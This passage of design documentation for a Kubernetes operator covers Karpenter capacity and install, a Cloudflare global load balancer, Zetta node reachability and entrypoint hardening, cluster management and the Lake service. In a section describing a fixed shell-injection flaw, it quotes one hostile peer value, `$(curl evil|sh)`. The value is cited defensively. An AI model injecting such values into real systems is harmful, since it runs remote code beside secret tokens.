`create_tables: true` is unchanged: use the separately provisioned Prod 2 analytics destination and
check its grants/table compatibility before deployment; this is no authorization to alter Prod 1.

**Source evidence (read 2026-10-07):** upstream
[analytics server at `11a6c2d`](https://github.com/oramasearch/analytics-processor/blob/11a6c2dd5c6db86bed2c617940c09b43d36e2c62/src/bin/server.rs)
binds `127.0.0.1:8888`. The existing bridge
[Dockerfile at `8ae627b`](https://github.com/oramasearch/orama-cloud-v1-bridge/blob/8ae627bcbbc200e1f201ffb68e66cf65a46d0a97/build/images/analytics-processor/Dockerfile)
patches it to `0.0.0.0:8080` and asserts the patch before compiling. The operator requires an image
built with that listener contract; an unpatched upstream image cannot serve its Service or probes.
No source repo changes or image builds were made for this issue. Writer JWT rendering follows
[OramaCore's provider schema at `983442f`](https://github.com/oramasearch/oramacore/blob/983442f2984d95dee9c09447a03f4228a574eebd/src/auth/jwt_manager.rs);
Firebase Secret keys and the exact JWT audience follow the
[dashboard at `9507a1a`](https://github.com/oramasearch/dashboard/blob/9507a1a592a32da7be8d543d7bf0df6f70a08f4f/src/app/api/user/jwt/route.ts)
and its `src/lib/auth/firebase-admin.ts`. Unit tests cover rendering, ownership, scheduling,
scaling, disable and prerequisite behavior; live importer, DNS and sign-in validation remain pending.

## Zetta elastic capacity (`zetta_capacity.go`) — 🟡 implemented, opt-in, not live-tested

The **first slice** of Zetta-driven elastic capacity ([operator#69](https://github.com/oramasearch/orama-operator/issues/69)):
`Zetta → operator → Karpenter → nodes → more Zetta nodes`. Opt-in via
`OramaZettaCluster.spec.capacity.karpenter.enabled` (default off). Reconciled from the
`OramaZettaCluster` controller (step 0, before the StatefulSet).

- **Owned `NodePool`** — the operator reconciles a Karpenter `NodePool` (`karpenter.sh/v1`)
  via **`unstructured`** (same decoupling as the CNPG `Cluster` — no dependency on Karpenter's
  Go types/version). It carries the cloud-neutral policy: a dedicated **taint**
  (`orama.cloud/zetta:NoSchedule`), the **pool label** (`orama.cloud/zetta-pool`) on the node
  template, `requirements` (os/arch/capacity-type + optional instance-type pin), the **cost cap**
  (`spec.limits` cpu/memory/nodes), and **stateful-safe disruption**
  (`consolidationPolicy: WhenEmpty`, a `nodes: "1"` budget, `expireAfter: Never`,
  `terminationGracePeriod: 1h`). CreateOrUpdate ⇒ the write is a no-op when nothing changed
  (anti-flap, principle #7).
- **Provider `NodeClass` is referenced, not owned** — `spec.capacity.karpenter.nodeClassRef`
  (`{group, kind, name}`) points at the platform's `EC2NodeClass` (EKS) / `AKSNodeClass`
  (AKS NAP). The NodeClass carries cluster-specific cloud details (AMI/subnet/IAM on AWS) the
  operator can't invent, so the platform owns it. `name` is required when enabled; missing ⇒
  `CapacityReady=False, Reason=Blocked`.
- **Scale trigger (this slice)** — pure **scheduling**: the Zetta pods get the matching
  toleration + `nodeSelector: {orama.cloud/zetta-pool: <name>}` (in `mutateZettaStatefulSet`),
  so raising `spec.replicas` past node capacity leaves pods **Pending → Karpenter provisions →**
  the pods schedule and join. The operator changes *desired replicas + NodePool limits*;
  Karpenter does the launch. A **Zetta-signal-driven** trigger (an `orama_control.scale_requests`
  row the operator polls) is the **next** slice — noted, not built.
- **Quorum-safety** — the Zetta pods carry `karpenter.sh/do-not-disrupt` (Karpenter never
  voluntarily evicts a live CRDT peer) + a `maxUnavailable: 1` **PDB**. Drain-safe,
  operator-driven **scale-down** (lower replicas, let Karpenter reclaim the emptied node) is a
  later slice.
- **Karpenter-absent = graceful no-op** — existence is checked via the **RESTMapper** (no
  informer started for a possibly-missing CRD). No `karpenter.sh/v1 NodePool` mapping ⇒
  `CapacityReady=False, Reason=KarpenterNotInstalled`, no crash-loop. Covers bare-metal / k0s
  clusters with no node autoscaler.
- **Cluster-scoped cleanup** — a `NodePool` is **cluster-scoped**, so a namespaced CR can't own
  it via `ownerReferences` (k8s GC would treat the owner as absent and delete it). Instead the
  pool is label-identified and cleaned up by a **finalizer** (`orama.cloud/karpenter-capacity`),
  added while capacity is on and released on disable or CR-delete. The namespaced PDB is
  owner-GC'd normally.
- **Status** — `status.provisionedNodes` (count of nodes labeled
  `karpenter.sh/nodepool=<pool>`, read via the **uncached APIReader** so the operator holds no
  cluster-wide Node informer) + the `CapacityReady` condition, both written only on change
  (anti-flap).

> **RBAC:** `karpenter.sh/nodepools` (`*`), `karpenter.sh/nodeclaims` +
> `karpenter.k8s.aws/ec2nodeclasses` + `karpenter.azure.com/aksnodeclasses` +
> core `nodes` (`get;list;watch`), and `policy/poddisruptionbudgets` — mirrored into
> `chart/templates/rbac.yaml`. A grant for a non-existent apiGroup is harmless.

## Operator-owned Karpenter install (`zetta_capacity_install.go`) — 🟡 implemented, opt-in, not live-tested

The **second slice** of [operator#69](https://github.com/oramasearch/orama-operator/issues/69)
([operator#75](https://github.com/oramasearch/orama-operator/issues/75)), extending the NodePool
work above: the NodePool reconcile *assumes* Karpenter is installed; this makes the operator **own the
install** too. Opt-in via `OramaZettaCluster.spec.capacity.karpenter.install` (default off). Reconciled as
**step 0** of the `OramaZettaCluster` controller, before the NodePool, so the CRDs exist first.

- **Vendored upstream manifests, server-side-applied** — the operator embeds (`go:embed`) the pinned
  **Karpenter v1.13.0** manifests under `internal/controller/assets/karpenter/v1.13.0/` — the CRD bundle
  (`NodePool`/`NodeClaim`/`EC2NodeClass`/`NodeOverlay`) and the controller bundle (ServiceAccount + RBAC +
  Deployment + Service + PDB) — and applies each document as an `unstructured` object via **server-side
  apply** (`client.Apply` + force-ownership). **No Karpenter Go types are vendored** (same decoupling as
  the NodePool reconcile). Re-vendor with [`hack/fetch-karpenter-manifests.sh`](../hack/fetch-karpenter-manifests.sh)
  (a reproducible `helm template` of the upstream OCI charts). Two fields carry placeholders
  (`__CLUSTER_NAME__` / `__CONTROLLER_ROLE_ARN__`); they are **never replaced as text**
  ([operator#79](https://github.com/oramasearch/orama-operator/issues/79)). The reconciler parses the
  template first, then sets the CR's values as structured fields: the ServiceAccount's
  `eks.amazonaws.com/role-arn` annotation and the controller container's `CLUSTER_NAME` env var, each
  found by kind, name and field path and required to hold its placeholder. The rendered bundle must be
  exactly the expected 13 objects (`karpenterControllerObjects` in
  `internal/controller/zetta_capacity_install_render.go`) and the CRD bundle exactly the 4 Karpenter
  CRDs, or nothing is applied.
- **Validated inputs** — `installClusterName` must match the EKS cluster-name rule and
  `controllerRoleARN` must be an IAM role ARN. The CRD schema refuses anything else at admission, and the
  reconciler checks again (a CR stored before the patterns existed): an invalid value gives
  `KarpenterInstalled=False, Reason=InvalidInstallSpec` on every cloud, before the finalizer or any object
  is written.
- **Cloud-gated** — the cloud is detected from a node's `providerID`:
  - **bare-metal / k0s** (no cloud providerID) ⇒ no-op, `KarpenterInstalled=False, Reason=BareMetalNoCloud`.
  - **AKS** ⇒ no-op, `Reason=ManagedByAKSNAP` — Node Auto Provisioning already deploys and manages
    Karpenter; use `enabled` (not `install`) there.
  - **EKS** ⇒ the self-install path proceeds.
- **Cloud IAM prerequisite, surfaced not crashed** — Karpenter's controller needs a cloud identity to
  create VMs, which the in-cluster operator **cannot mint** (a cloud-account prereq, like the image pull
  secret). On EKS the reconciler checks `controllerRoleARN` (the IRSA role) + `installClusterName`
  **before** deploying the controller; if the identity is missing it reports
  `KarpenterInstalled=False, Reason=CloudIdentityMissing` and does **not** deploy (no `CrashLoopBackOff`).
  Full detail: [`docs/karpenter-cloud-iam-prerequisite.md`](karpenter-cloud-iam-prerequisite.md).
- **Cluster-singleton, ref-counted cleanup** — the controller install is shared by every CR that opts in.
  A namespaced CR can't own the cluster-scoped CRDs/ClusterRoles, so cleanup is a **finalizer**
  (`orama.cloud/karpenter-install`) that removes the operator-managed controller resources only when **no
  other** `OramaZettaCluster` still requests the install. **The CRDs are applied but never deleted** on
  teardown — deleting a Karpenter CRD cascades to every `NodePool`/`NodeClaim` in the cluster.
- **Status** — a `KarpenterInstalled` condition (`InvalidInstallSpec` / `BareMetalNoCloud` / `ManagedByAKSNAP` / `UnsupportedCloud`
  / `CloudIdentityMissing` / `InstallClusterNameRequired` → `InstallProgressing` → `Installed`), written
  only on change (anti-flap).

> **RBAC (install):** `apiextensions.k8s.io/customresourcedefinitions` — `get;list;watch` on all,
> `create;update;patch` only on the 4 Karpenter CRD names (**no `delete`**, CRDs aren't GC'd). And
> `rbac.authorization.k8s.io` — `get;list;watch` on all roles and bindings; `create;update;patch;delete`
> plus `bind;escalate` **only on the bundle's names** (`clusterroles` karpenter, karpenter-admin,
> karpenter-core; `clusterrolebindings` karpenter, karpenter-core; `roles` and `rolebindings` karpenter,
> karpenter-dns). Creating RBAC that grants Karpenter's broad permissions needs `bind` + `escalate`, since
> the operator doesn't itself carry every node/pod grant; scoping them by `resourceNames` means the
> operator cannot create, bind or escalate any other role, binding or CRD (operator#79,
> `TestKarpenterInstallEnvtest` proves both halves against a real API server). ServiceAccounts,
> Deployments, Services and PDBs the install creates are already granted. Mirrored into
> `chart/templates/rbac.yaml`; `TestChartKarpenterRBACMatchesBundle` keeps the names in step with the
> bundle, so re-vendoring a Karpenter version that renames an object fails until both are updated.

> **Follow-ups (later slices of #69):** the Zetta→operator signal channel
> (`orama_control.scale_requests`); drain-safe, quorum-aware scale-down; multi-cluster
> placement policy (per-operator identity already namespaces the state); consent-trail
> integration (`add_nodes` / `approve_consent`); live validation on an EKS + AKS-NAP cluster.

## Cloudflare global Load Balancer (`cloudflareloadbalancer_controller.go`) — 🟡 implemented, not live-tested

The `CloudflareLoadBalancer` CRD ([#73](https://github.com/oramasearch/orama-operator/issues/73))
turns a single hostname into a **global load balancer** — origin pools of wan-accessible
nodes, health checks, geo/proximity steering, and failover — the actual geo-LB. It is the
same "external resource as an owned CRD" shape as `CloudflareDNSRecord`: the child
controller makes the CF API calls and holds a finalizer, so the main loop never mutates
Cloudflare directly. From **one** CR it reconciles three Cloudflare Load Balancing objects:

- a **Health Monitor** (account-scoped) — `type` http/https/tcp, `path` (default
  `/v1/server_info`), `interval`/`timeout`/`retries`, `expectedCodes`; drops unhealthy
  origins from rotation.
- one or more **Origin Pools** (account-scoped) — each a named set of origins
  (`{name, address, enabled, weight}`), `minimumOrigins`, the monitor attached. Pools that
  leave the spec are pruned after the LB stops referencing them.
- the **Load Balancer** (zone-scoped) — the `hostname`, `default_pools` (spec order),
  `fallbackPool`, `steeringPolicy` (`off｜geo｜dynamic｜proximity｜random`; `dynamic` maps to the
  API's `dynamic_latency`), optional `regionPools` (region code → pool names) for geo
  steering, and `proxied`.

**Idempotent + merge-not-clobber:** create-or-adopt (list by our `orama-operator:<ns>/<name>`
description tag / by pool name / by hostname), then **PATCH only the fields we manage** so
server-managed fields are left intact. **Anti-flap (principle #7):** the status subresource
(LB id, monitor id, per-pool ids + health, a `Ready` condition) is written **only on a real
transition** (deep-compare); a steady LB produces zero control-plane writes, refreshed on a
5-minute resync. **Graceful when Load Balancing is off:** a 403/entitlement error →
`Ready=False (LoadBalancingNotEnabled)` + a gentle requeue, never a crash-loop. **Safe no-op**
until the Secret (token+zoneID+accountID) exists → `Ready=False (WaitingForCredentials)`.

> **Follow-ups:** validate against a live Cloudflare account with Load Balancing enabled;
> auto-populate pool origins from the live wan-accessible node set
> ([#74](https://github.com/oramasearch/orama-operator/issues/74) /
> [zetta#739](https://github.com/oramasearch/zetta/issues/739)) so the main loop creates/updates
> the `CloudflareLoadBalancer` as nodes come and go.
**Zetta cluster reachability + the CF LB origin pool.** The `OramaZettaCluster` reconciler
(`internal/controller/oramazettacluster_controller.go`) classifies each slice by its **node-reachability
type** (`spec.reachability`, [operator#74](https://github.com/oramasearch/orama-operator/issues/74)):
a **`wan-accessible`** slice is a rendezvous whose routable address the operator advertises as
`.status.wanAddress` (from `spec.wanAddress` / `spec.hostNetwork` / `spec.exposePeerLoadBalancer`), while a
**`dial-out-only`** slice (the default, and any `spec.ephemeral` slice) dials OUT only and **never gets an
inbound peer LoadBalancer** — the operator ignores `spec.exposePeerLoadBalancer` on it (warns + tears down
any existing LB), fixing the earlier anti-pattern of fronting a private node with an inbound LB
([zetta#739](https://github.com/oramasearch/zetta/issues/739)). Two consumers read the wan-accessible set:
siblings copy `.status.wanAddress` into their `spec.externalPeers`, and the **Cloudflare LB origin pool**
([operator#73](https://github.com/oramasearch/orama-operator/issues/73) / the
`CloudflareLoadBalancer` CRD, [operator#76](https://github.com/oramasearch/orama-operator/pull/76))
is populated from those addresses (HTTP origin at the same host `:4800`) — the documented wiring hook, not
yet auto-populated here.

**Zetta runtime environment.** `spec.env` accepts Kubernetes `EnvVar` values and sources, appends
accepted entries after the variables the operator owns, and updates the StatefulSet pod template so a
change rolls the nodes. Operator-owned names cannot be overridden; their sorted names are exposed as
`status.ignoredEnvVars` without changing readiness. Lake copies `spec.zetta.env` to its data-plane child
and `spec.services.zettaEnv` to every managed or adopted Zetta service cluster.

**Zetta volume ownership.** Every node pod runs with uid/gid/fsGroup 10001 and
`fsGroupChangePolicy: OnRootMismatch`. A per-node RWO volume that attaches after a node move therefore
skips the recursive ownership pass when the `/data` root already has the expected group, while a new
or mismatched volume is still corrected before Zetta starts.

**Reachability + node-type FLAGS into the engine** (`mutateZettaStatefulSet`,
[zetta#803](https://github.com/oramasearch/zetta/issues/803)/[#810](https://github.com/oramasearch/zetta/issues/810)).
Classifying the slice is not enough — the operator must tell the *engine* what each node is, or the engine
seeds its CRDT `node:<id>` entry with its permanent/wan-accessible DEFAULT and `system.nodes` mislabels a
private slice while the **reachability-aware dialer stays dormant** (nodes keep advertising bound pod IPs, so
the pod-CIDR-collision undercount #803 fixes can recur). So the entrypoint now renders **`--dial-out-only`**
iff `zettaReachability` (the single source of truth shared with status + topology) is `dial-out-only`, and
**`--node-type ephemeral|permanent`** from `spec.ephemeral`. The two are **independent** axes (a private
permanent home node is `dial-out-only` + `permanent`; burst capacity is `dial-out-only` + `ephemeral`).
These are FLAGS, so they require the auth-capable image generation the operator
already mandates (post-[#799](https://github.com/oramasearch/zetta/issues/799) travels with #803/#810); an
older image would crash on the unknown flag. Verify with `SELECT reachability, node_type FROM system.nodes`.

**Zetta node entrypoint: no CR data in shell text** (`internal/controller/zetta_peers.go`,
[operator#279](https://github.com/oramasearch/orama-operator/issues/279)). The node container runs
`/bin/sh -c <zettaEntrypointScript>`, a **constant** script — the same bytes for every
`OramaZettaCluster`, with only Go constants (`/data`, `:7777`, `:4800`) formatted in. A shell is still
needed for the per-node values only known at run time (the ordinal from `POD_NAME`, `HOST_IP` under
`hostNetwork`, this node's field of `ZETTA_ADVERTISE_MAP`). Everything variable is data: the container
**args** are `zetta-entrypoint` (`$0`), the node flags, `--`, then the external peers one per argument; node-0's
seed address is the env var `ORAMA_ZETTA_SEED` (deliberately not the engine's own `ZETTA_SEED_PEER`); the
advertise map and tokens are env vars. The admin token is no longer passed as `--admin-token`: argv is
readable by every process on the node (`/proc/<pid>/cmdline`), and the engine reads `ZETTA_ADMIN_TOKEN` from
its environment when the flag is absent. `spec.env` cannot set `ORAMA_ZETTA_SEED` or the engine's own
`ZETTA_SEED_PEER`/`ZETTA_DATA_DIR`. The script grows the argv with `set -- "$@" …` and ends
with `exec zetta "$@"`, so no value is ever re-parsed, split or globbed. Before #279 the peers were pasted
into the script, so a peer such as `$(curl evil|sh)` — from `spec.externalPeers` or from any operator able to
append to the shared topology table — ran in every Zetta pod beside `ZETTA_ADMIN_TOKEN` and
`ZETTA_CLUSTER_TOKEN`. Peers are also **validated** as `host:port` (CRD pattern + controller): an invalid
`spec.externalPeers`/`spec.wanAddress` is refused (StatefulSet untouched, `PeerAddressesValid=False`, values
Go-quoted in the message), an
invalid topology address is trimmed, then dropped and reported (logged once per change), and resolved advertise addresses are checked before they are
advertised or written to the topology. For valid input the argv is what the old entrypoint produced minus
`--admin-token <token>`, and zetta still sees the token in its environment — `TestZettaEntrypointMatchesLegacyArgv` runs both scripts (under `/bin/sh` and dash, the Ubuntu
image's `/bin/sh`) against a stub `zetta` for every shape and ordinal. Changing the pod template (new
`command`, `args`, env var) **rolls every Zetta pod once** when an operator with this change first reconciles.

**Cross-cluster topology THROUGH Zetta** (`internal/controller/zetta_topology.go`,
[operator#105](https://github.com/oramasearch/orama-operator/issues/105)). Instead of an admin
hand-copying `.status.wanAddress` into siblings' `spec.externalPeers`, the operator coordinates peering
through its own datastore. Each reconcile (gated on the datastore symbiosis, best-effort like the state sync)
it **writes** this slice's wan-accessible endpoints into `orama_control.topology` (append-only, anti-flapped
like `components` — one row per node, namespaced by `operator` + global `cluster` name), Zetta **CRDT-syncs**
that table across every cluster, and it **reads** the table back (latest-wins per node by `updated_at`) to
**derive** its `--peer` set from the OTHER slices' wan endpoints. The StatefulSet's `--peer` flags
(`mutateZettaStatefulSet` → `zettaPeerSet`) are the **union** of `spec.externalPeers` (explicit override —
wins) and the derived set (deduped, excluding this slice's own nodes/addresses); topology rows are untrusted, so a
derived address that is not a valid `host:port` is dropped and named in `PeerAddressesValid`
([operator#279](https://github.com/oramasearch/orama-operator/issues/279)). Failover: a departed wan node
(scale-down / flip to `dial-out-only`) gets a **`status='gone'` marker row** and falls out of the derived set
next reconcile. Reads go through `zettaSQLQuery` (parses `.value.rows`; sends the admin bearer). **Blocked:**
removing a departed node from Zetta's own **membership CRDT** node-list is not possible over SQL (append-only)
and has no engine API yet — the `gone` marker affects only the derived `--peer` set, not the engine node-list
(see [`zetta-datastore.md`](zetta-datastore.md)).

**Observed-state projection** (`internal/controller/zetta_statesync.go`). The same enabled datastore
loop writes changed `OramaCloudV1`, `OramaZettaCluster`, and namespace-matched cluster-scoped `Lake`
status into `orama_control.components`, with a paired `component.state_changed` row in
`reconcile_events`. Both authenticated appends are best-effort and fingerprinted; a steady status writes
nothing, and a partial component/event pair retries only the missing append. Lake's full status is stored
as deterministic JSON in the component detail. See [Zetta as the operator datastore](zetta-datastore.md)
and the [Lake observed-state contract](lake/README.md#observed-state-in-zetta).

## The log is kept readable by fixing errors, never by hiding them

Steve, 2026-10-12: the log is quieted by fixing errors, not by turning off logging.

A reconcile that fails returns its error. The manager logs it and retries, and it stays in the log
until its cause is fixed. No controller downgrades, swallows or slows down an error to make the log
quieter. Two examples from the day the rule was stated:

- **Cloudflare refused the v1 sandbox's R2 bucket** with 403 from July to October. The fix was
  enabling R2 on the account, after which the bucket reconciled. A change that would have
  rechecked it quietly every 30 minutes was written, and removed.
- **A status write was refused as a conflict** on a new `KubernetesClusterProvider`. The cause was
  the write itself: a full update with a version check, from a cached read one write behind. The
  cluster-management controllers now write status as a patch of what changed, which has no version
  check, because each is the only writer of its status. A change that would have swallowed the
  conflict was written, and removed.

What remains from that work is correctness, not quiet: `settle` never returns a result together
with an error, and the KV namespace and R2 bucket controllers write a failure to status only when
it changes instead of on every retry.

## Cluster management (`kubernetescluster_controller.go`, `akscluster_controller.go`, `azure_resource_manager.go`, `clusterhelmrelease_controller.go`, `oramaoperator_controller.go`, `leaf_operator_installer.go`) — ✅ live on `orama-nonprod-cluster-01` (2026-10-12)

Managing other clusters ([`infrastructure/README.md`](infrastructure/README.md),
[#351](https://github.com/oramasearch/orama-operator/issues/351),
[#354](https://github.com/oramasearch/orama-operator/issues/354),
[#363](https://github.com/oramasearch/orama-operator/issues/363)). These controllers run in every
cluster's operator, with no flag: the operator is the same on a management cluster and a leaf, and
a cluster manages others by holding the resources. `ClusterHelmRelease` and `OramaOperator` install
pinned chart releases and the operator itself onto a managed cluster with the Helm library.

| Controller | Reconciles | Creates |
|---|---|---|
| `KubernetesClusterReconciler` | `KubernetesCluster` (abstract) | One owned `AksCluster` when the provider has type `aks`; nothing else |
| `KubernetesClusterProviderReconciler` | `KubernetesClusterProvider` | Nothing; it checks the credentials and holds the provider while a cluster uses it |
| `AksClusterReconciler` | `AksCluster` (concrete) | In Azure: a resource group and a managed cluster. In the cluster: the owned kubeconfig Secret |

- **Only `azure_resource_manager.go` and `akscluster_controller.go` name Azure.** The abstract
  controller maps the neutral fields and the provider's settings onto an `AksCluster` with a pure
  function, so the same pair always produces the same concrete resource.
- **Create, observe and delete only.** A cluster is not changed after it exists; the `InSync`
  condition reports what differs.
- **Nothing is installed on the new cluster yet.** Its platform layer and its own operator are the
  next stages of [#355](https://github.com/oramasearch/orama-operator/issues/355).
- **Not live-tested.** The tests run against a fake Azure Resource Manager. No real cluster has
  been created by these controllers.

## `Lake` — the lake service (liquid project)

Reconciler: `internal/controller/lake_controller.go`. Full page: [`lake/README.md`](lake/README.md);
field reference: the `Lake` section of [`crd-reference.md`](crd-reference.md). This is not part of
the Orama Cloud v1 stack: it deploys `oramasearch/lake`, the hosted service of the liquid project,
and reuses this operator's CNPG, PostgresSchema and Cloudflare DNS paths.

| Creates | Name | Owned | Notes |
|---|---|---|---|
| Namespace | `spec.namespace` | no | blind Create, AlreadyExists ignored; never deleted |
| Secret | `lake-<name>-admin` | yes | admin bearer token, 64 hex, minted once |
| Secret | `lake-<name>-instance-kek` | yes | root wrapping key for lake's customer KEKs, minted once while Postgres is enabled |
| Secret | `lake-<name>-sealing-key` | yes | active and retained X25519 private keys; public recipient is published in Lake status and injected into lake |
| PersistentVolumeClaim | `spec.store.existingClaim` or `lake-<name>-store` | only the generated claim | generated once from size/class/modes and preserved across store spec changes; mounted at `/var/lib/lake/store` |
| Deployment | `lake-<name>` | yes | resource defaults or `spec.resources`; `/healthz` liveness and `/readyz` readiness; non-root uid/gid 10001; startup probe; zero-unavailable surge rollout for a ReadWriteMany store, `Recreate` for a single-replica ReadWriteOnce store unless `spec.rollout.overlapOnSharedStore` opts into a surge co-located with the running pod, and always for ReadWriteOncePod; 15 s kubelet-sleep pre-stop drain in a 45 s grace period; default or configured topology spread; store mount and `LAKE_STORE_ROOT` |
| PodDisruptionBudget | `lake-<name>` | yes | created only above one replica with `maxUnavailable: 1`; removed when scaled to one |
| Service | `lake-<name>` | yes | ClusterIP 80 → `spec.port` |
| `OramaZettaCluster` | `lake-<name>-zetta` | yes | `spec.zetta`, including `env`; data plane only, so operator-schema provisioning is off; deletion completes before the Lake finalizer is released |
| CNPG `Cluster` | `lake-<name>-controldb` | yes (unstructured) | `spec.postgres`: instances, storageSize (50Gi), storageClassName; disable tears down **with data** |
| ConfigMap + `PostgresSchema` | `lake-<name>-controldb-migrations`, `-schema` | yes | `assets/lake-schema.sql` vendored from `oramasearch/lake` `db/schema.sql`; guard = the newest migration's table (`workspace_volumes_guard`, `0069_workspace_volumes`); the Job also requires every migration the file records in `schema_migrations` (#271) |
| CNPG `ScheduledBackup` | `lake-<name>-controldb-backup` | yes (unstructured) | opt-in Barman R2/S3 backup; CNPG `Backup` resources are observed by `cnpg.io/cluster` label |
| `LakeRestoreRehearsal` scratch resources | `lake-rehearsal-<name>-<hash>` | yes | temporary Namespace containing a recovered CNPG Cluster, copied credentials, and a verification Job; all are deleted after a terminal result |
| Ingress + `CloudflareDNSRecord` | `lake-<name>`, `-dns` | yes | opt-in via `ingressEnabled` + `host` + `dnsSecretRef`, optional `tls.secretName`, and Lake streaming annotations |
| `LakeE2ETest` Job | `<test-name>-e2e` in the Lake namespace | yes, by the cluster-scoped test | starts only after Lake, Postgres, and schema readiness; the required image owns signup and liquid push/pull assertions |

Lake creates or updates its Deployment and disruption budget only after the desired schema
version is Applied. An existing Deployment stays unchanged while migration is pending or failed.
Re-vendor by copying lake `db/schema.sql` unchanged, updating the pinned commit/SHA-256 and guard,
and running the byte comparison and envtest proof in [`lake/schema.md`](lake/schema.md).
The SQL-plus-guard hash replaces obsolete migration Jobs automatically, waiting for their pods
before a replacement starts. Incremental migration files remain #126.

The `LakeSealedSecret` reconciler opens literal canonical-CBOR envelopes or requests sealed static
and dynamic values from lake, then owns an output Secret labelled `lake.orama.cloud/sealed: "true"`.
It rejects an unrelated Secret at the requested name. See [`lake/sealed-secrets.md`](lake/sealed-secrets.md).

Status mirrors the Deployment, publishes the active sealing recipient and retained-key counts,
selected store claim (claim, phase, capacity, and `StoreReady`),
the CNPG cluster (polled every 20 s, not watched), the PostgresSchema, the owned Zetta cluster
(`zettaReady` and `ZettaReady`), and enabled backup completion. Overall `Ready` requires the current
Deployment generation with all desired ready, updated, and available replicas; a Bound store;
all configured Postgres instances ready and the current schema Applied when Postgres is enabled;
and the enabled Zetta child Ready. Failed schema or Deployment states report `Degraded`, while
pending work reports `Progressing`; `conditions[Ready]` explains the blocker. CNPG polling continues
after success even with backups disabled, so later readiness loss updates the phase. Unchanged
polls write zero status updates. This contract is covered by native fake-client regressions.
Production: `Lake/prod` in namespace `lake` on AKS; R2 backup credentials must exist before its backup is enabled.

`LakeE2ETest` watches the cluster-scoped Lake independently of normal reconciliation. Target changes
and a 15-second pending requeue release the test once the Deployment, Postgres, and schema are ready.
The immutable Job then drives `http://lake-<name>.<namespace>.svc.cluster.local` from its runner image
and reports `Running`, `Succeeded`, or `Failed` without rewriting an unchanged status.
